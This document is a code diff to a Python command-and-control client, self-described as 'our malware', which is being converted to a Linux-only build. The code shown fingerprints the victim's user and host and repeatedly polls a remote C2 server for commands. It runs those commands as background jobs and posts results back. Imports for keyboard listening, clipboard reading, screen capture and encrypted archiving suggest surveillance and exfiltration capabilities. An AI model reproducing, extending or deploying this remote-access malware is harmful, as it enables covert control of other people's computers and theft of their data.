@@ -1,18 +1,13 @@
-"""
-Command & Control Client Side Coding
-Author: Davood Yahay(D.Yakuza)
-"""
-# Import os methods based on OS, use platform.system() to detect OS
-from platform import system
+#!/usr/bin/env python3
 
-if system() == "Windows":
-    from os import getenv, chdir, path, getcwd
-elif system() == "Linux":
-    from os import getenv, uname, chdir, path, getcwd
-# Import for Windows Builds Only
-from rotatescreen import get_displays
+""" linux_client.py -
+Yakuza Command & Control (C2) Linux client codes
+Author: Davood Yahay(D.Yakuza)
+Last Update: 10 oct 2024 - 16 mehr 1403
+"""
 
 # Import for both Linux & Windows Builds
+from os import getenv, uname, chdir, path, getcwd
 from requests import get, exceptions, post, put
 from colorama import Fore
 from time import time, sleep
@@ -21,7 +16,6 @@ from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from pyperclip import paste, PyperclipWindowsException
 from pynput.keyboard import Listener, Controller, Key
 from PIL import ImageGrab, Image
-from winsound import PlaySound, SND_ASYNC
 from multiprocessing import Process
 
 from encryption import cipher
@@ -100,21 +94,10 @@ if __name__ == "__main__":
     # jobCount used to count background jobs
     jobCount = 0
 
-    # If Client have Windows OS
-    if system() == "Windows":
-        # For Windows obtain a unique identifying Information
-        client = (getenv("USERNAME", "Unknown-Username") + "@" +
-                  getenv("COMPUTERNAME", "Unknown-Computer Name") + "@" + str(time()))
+    # For Linux, get a unique identifying Information
+    client = (getenv("LOGNAME", "Unknown-Username") + "@" + uname().nodename + "@" + str(time()))
 
-    # Elif Client have Linux OS
-    elif system() == "Linux":
-        # For Linux, get a unique identifying Information
-        client = getenv("LOGNAME", "Unknown-Username") + "@" + uname().nodename + "@" + str(time())
-
-    # If OS is not windows or linux, use a Linux version of the client
-    else:
-        client = getenv("LOGNAME", "Unknown-Username") + "@" + uname().nodename + "@" + str(time())
-
+    # UTF-8 encode the client first to be able be encrypting it, but then we need string, so decode it at the end
     encryptedClient = cipher.encrypt(client.encode()).decode()
 
     # clientPrint used for print only username@machine from client variable
@@ -126,9 +109,6 @@ if __name__ == "__main__":
         '''Try an http get requests to the C2 Server and retrieve command;
         if failed, Keep Trying forever.'''
         try:
-            # test print
-            print("__name__:", __name__)
-
             response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encryptedClient}", headers=HEADERS, proxies=PROXY)
             # print(f"{Fore.LIGHTYELLOW_EX}{client.split("@")[0]}{Fore.MAGENTA} => {Fore.LIGHTBLUE_EX}{response.status_code}{Fore.RESET}")
             print(client.split("@")[0], "=>", response.status_code, sep=" ")
@@ -208,10 +188,6 @@ if __name__ == "__main__":
                 # Start a background job using a Multiprocessing process for the command that we entered
                 jobs.append(Process(target=run_job, args=(command, jobCount+1)))
                 jobs[jobCount].start()
-
-                # Test printt
-                print("jobs list:", jobs)
-                print("jobs count:", jobCount)
 
                 # give run_job function time to post status to our c2 server, before a new command get request happens
                 sleep(1)
@@ -352,7 +328,6 @@ if __name__ == "__main__":
 
         # the client Kill Command shutdown our malware
         elif command == "client kill":
-            post_to_server(f"{client} has been Killed. \n")
             exit()
 
         # the 'client delay SECOND' command will Change delay time between Inactive Re-Connection attempts
@@ -461,37 +436,13 @@ if __name__ == "__main__":
                     image.show()
                     post_to_server(f"[+]-Client => {filepath} is now Displaying on the {clientPrint}. \n")
                 except OSError as e:
-                    # test print
-                    #print(e, "\n")
-                    if "cannot identify image".lower() in str(e).lower():
+                    if "cannot identify image" in str(e).lower():
                         post_to_server(f"[!]-Client => {filepath} is not an image. \n")
-                    elif "No such file".lower() in str(e).lower():
+                    elif "no such file" in str(e).lower():
                         post_to_server(f"[!]-Client => {filepath} is not Found on the {clientPrint}. \n")
                     else:
                         post_to_server(f"[!]-Client => Unable to Display {filepath} on the {clientPrint}. \n")
 
-        # the "client flip screen" will flip the user screens upside down; run again to reset screen Position
-        elif command == "client flip screen" or command == "client flip":
-            screens = get_displays()
-            for screen in screens:
-                startPos = screen.current_orientation
-                # Use this formula to flip the screen upside down
-                pos = abs((startPos - 180) % 360)
-                screen.rotate_to(pos)
-
-        # the "client rotate screen" will rotate(roll) the screen on each monitor the user is using
-        elif command == "client rotate screen" or command == "client rotate":
-            screens = get_displays()
-            for screen in screens:
-                startPos = screen.current_orientation
-
-                # range must be 5, 9, 13, 17, … in order for the screen to end up at the starting position
-                for i in range(1 , 5):
-                    # Use this formula to rotate(roll) the screen on each monitor
-                    pos = abs((startPos - i * 90) % 360)
-                    screen.rotate_to(pos)
-                    # Configure a delay between 90 degree. shift
-                    sleep(1.5)
 
         # the "client max volume" command allows us to turn Client's machine volume on Max Volume
         elif command == "client max volume" or command == "client max":
@@ -500,20 +451,6 @@ if __name__ == "__main__":
                 keyboard.press(Key.media_volume_up)
                 keyboard.release(Key.media_volume_up)
 
-        # the 'client play FILENAME.wav' command can be used to play voice recordings or waw music on the client
-        elif command.startswith("client play"):
-            filepath = get_filename(command)
-            if filepath is None:
-                continue
-            try:
-                # Make sure filepath is existing and its wav file
-                if path.isfile(filepath) and filepath.lower().endswith(".wav"):
-                    PlaySound(filepath, SND_ASYNC)
-                    post_to_server(f"[+]-Client => {filepath} is now Playing on the {clientPrint}. \n")
-                else:
-                    post_to_server(f"{filepath} is Not Found on the {clientPrint} or filename don't end with .wav \n")
-            except OSError:
-                post_to_server(f"Accessing {filepath} caused an OS Error on {clientPrint}. \n")
 
         # Else, the wrong input, actually not a Built-in Command or Shell Command or Client/Server Commands
         else:
